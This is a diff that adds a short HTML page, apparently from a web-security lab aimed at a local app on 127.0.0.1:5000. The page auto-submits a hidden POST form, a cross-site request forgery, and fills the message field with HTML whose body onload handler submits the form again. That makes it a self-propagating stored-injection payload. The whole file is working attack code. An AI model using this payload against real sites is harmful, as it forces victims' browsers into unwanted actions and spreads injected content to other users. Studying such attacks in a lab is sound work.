@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <form action="http://127.0.0.1:5000/posts" method="POST">
+
+        <input type="hidden" name="message" value="Pop"/>
+        
+    </form>
+    <script>
+        document.forms[0].message.value = '<form action="http://127.0.0.1:5000/posts" method="POST"><input type="hidden" name="message" value="Pop"/></form><body onload="document.forms[1].submit()"></body>'
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
